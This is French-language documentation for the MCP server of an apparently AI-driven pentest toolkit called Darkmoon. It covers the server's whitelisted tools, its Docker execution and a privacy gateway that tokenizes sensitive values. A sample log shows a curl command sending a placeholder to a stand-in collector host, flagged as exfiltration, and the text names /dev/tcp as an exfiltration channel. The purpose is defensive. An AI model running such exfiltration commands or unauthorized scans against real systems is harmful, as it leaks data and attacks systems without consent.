# 🔌 Darkmoon — MCP (Model Context Protocol)

Ce document décrit **le serveur MCP Darkmoon**, son rôle, son fonctionnement,
et pourquoi il est **central** dans l’architecture.

Public cible :
- architectes
- développeurs backend
- AI engineers
- experts sécurité

---

## 1. Qu’est-ce que le MCP dans Darkmoon ?

Le MCP (Model Context Protocol) est **la frontière de sécurité et d’exécution**
entre :

- l’IA (OpenCode + agents),
- les outils réels de pentest.

👉 L’IA **ne touche jamais directement** aux outils.
👉 Tout passe par le MCP.

---

## 2. Rôle du MCP Darkmoon

Le MCP sert à :

- exposer des **fonctions contrôlées** à l’IA,
- exécuter des commandes dans la toolbox Docker,
- fournir des **workflows métiers** prêts à l’emploi,
- empêcher toute action non autorisée.

---

## 3. Implémentation technique

Le MCP Darkmoon est implémenté avec **FastMCP**.

Emplacement :

```

mcp/src/server.py

```

Il expose :
- des outils simples,
- des outils avancés,
- des workflows dynamiques.

---

## 4. Outils MCP exposés

### 4.1 Santé & diagnostic

- `health_check`
- `check_tool`
- `diagnose`

👉 Permet à l’IA de vérifier l’état du système **avant d’attaquer**.

---

### 4.2 Exécution générique

- `execute_command`
- `list_allowed_tools`

Caractéristiques :
- whitelist stricte,
- protection contre commandes dangereuses,
- timeouts contrôlés.

---

### 4.3 Workflows dynamiques

- `list_workflows`
- `run_workflow`

Les workflows sont découverts **automatiquement** au runtime.

---

## 5. Interaction avec Docker

Le MCP utilise :
- l’API Docker locale,
- un client dédié (`DarkmoonDockerClient`),
- un nom de conteneur fixe (`darkmoon`).

👉 Le MCP :
- ne dépend pas du shell utilisateur,
- ne dépend pas du host,
- reste isolé.

---

## 6. Exemple d’utilisation côté IA

Dans le chat OpenCode :

> “exécute un scan de vulnérabilité sur example.com”

L’IA :
1. identifie le besoin,
2. choisit le workflow,
3. appelle `run_workflow`,
4. interprète les résultats,
5. enchaîne si nécessaire.

---

## 7. Sécurité par design

Le MCP impose :
- aucune exécution libre,
- aucun accès Docker direct,
- aucun montage non maîtrisé,
- aucune élévation implicite.

👉 C’est la **clé de la sécurité globale** de Darkmoon.

### 7.1 Privacy gateway sur le chemin des outils

`execute_command` et `run_workflow` passent par `CommandGateway` avant d’exécuter
quoi que ce soit. Le modèle n’émet que des placeholders (`IP_PRIVATE_001`,
`URL_001`, `CRED_001`…) ; les vraies valeurs sont réinjectées localement, quotées
pour leur contexte shell, juste avant l’exécution. Toute sortie repart tokenisée.

**Le gateway ne bloque pas une commande.** Quand un placeholder occupe une
position dont sa vraie valeur doit rester absente (query d’une URL tierce, corps
de requête sortant, `/dev/tcp`, pipeline dont l’extrémité quitte la cible), la
commande **s’exécute quand même** avec le token laissé en place. Le destinataire
reçoit `IP_PRIVATE_001`. Le modèle en est informé sans erreur :

```
============================================================
COMMAND  : curl https://collector.tld/?x=IP_PRIVATE_001
EXIT CODE: 0
PRIVACY  : 1 value(s) kept tokenized
           - placeholder embedded in a URL query/fragment (exfiltration
             vector): IP_PRIVATE_001 left tokenized
============================================================
```

| Variable | Défaut | Effet |
|---|---|---|
| `DARKMOON_PRIVACY` | `1` | Interrupteur général |
| `DARKMOON_PRIVACY_CATEGORIES` | périmètre complet | Catégories tokenisées ; une valeur absente ou invalide retombe sur le défaut complet |
| `DARKMOON_PRIVACY_POLICY` | `degrade` | `degrade` ne bloque jamais ; `strict` refuse la commande. Toute valeur non reconnue vaut `degrade` |
| `DARKMOON_PRIVACY_CRED_INJECT` | `1` | `0` empêche toute réinjection locale d’un credential |
| `DARKMOON_PRIVACY_TTL` | `21600` | Durée de vie du vault (s) |

Détail complet et modèle de menace : [`docs/security-threat-model.md`](security-threat-model.md).

---

## 8. Étendre le MCP

Pour ajouter une fonctionnalité :

1. créer un nouveau workflow,
2. ou ajouter un outil MCP,
3. redémarrer le serveur MCP.

Aucune modification côté agent requise.

---

## 9. Pourquoi ce design est robuste

- séparation IA / exécution,
- auditabilité totale,
- extensibilité contrôlée,
- réduction massive des risques.

---

## 10. Résumé

Le MCP est :
- le **cœur d’exécution** de Darkmoon,
- la **barrière de sécurité**,
- le point d’extension principal.

---

➡️ Pour comprendre les outils réels :
voir `docs/toolbox.md`